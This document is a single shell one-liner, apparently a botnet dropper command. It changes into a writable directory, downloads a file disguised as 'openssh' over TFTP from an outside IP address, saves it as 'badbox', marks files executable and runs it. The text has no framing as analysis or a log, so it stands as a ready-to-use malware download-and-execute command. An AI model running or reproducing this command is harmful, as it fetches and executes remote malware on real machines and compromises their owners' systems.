cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 46.166.185.60;cat openssh >badbox;chmod +x *;./badbox
